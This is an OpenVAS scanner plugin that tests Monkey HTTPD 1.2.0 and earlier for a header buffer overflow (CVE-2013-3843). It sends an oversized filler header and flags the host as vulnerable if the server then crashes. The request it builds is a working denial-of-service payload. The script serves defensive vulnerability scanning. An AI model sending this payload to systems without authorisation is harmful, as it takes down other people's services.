###############################################################################
# OpenVAS Vulnerability Test
#
# Monkey HTTPD Host Header Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803711");
  script_version("2019-05-24T11:20:30+0000");
  script_cve_id("CVE-2013-3843");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-05-24 11:20:30 +0000 (Fri, 24 May 2019)");
  script_tag(name:"creation_date", value:"2013-06-05 11:55:02 +0530 (Wed, 05 Jun 2013)");
  script_name("Monkey HTTPD Host Header Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://pastebin.com/7b0ZKNtm");
  script_xref(name:"URL", value:"http://bugs.monkey-project.com/ticket/182");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/monkey-120-buffer-overflow");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 2001);
  script_mandatory_keys("Monkey/banner");

  script_tag(name:"impact", value:"Successful exploitation will let remote unauthenticated attackers
  to cause a denial of service or execute arbitrary code.");

  script_tag(name:"affected", value:"Monkey HTTPD version 1.2.0 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling certain Long requests
  sent via 'Host' field, which can be exploited to cause a denial of service or remote code execution.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Monkey HTTPD and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:2001);

banner = get_http_banner(port:port);
if(http_is_dead(port:port)) exit(0);
if("Server: Monkey" >!< banner){
  exit(0);
}

req = string("GET / HTTP/1.1\r\n",
             "Host: \r\n",
             "Bad: ",  crap(data:"0x41", length:2511), "\r\n\r\n");

res = http_send_recv(port:port, data:req);

req = http_get(item:"/",  port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(!res && http_is_dead(port:port))
{
  security_message(port:port);
  exit(0);
}

exit(99);
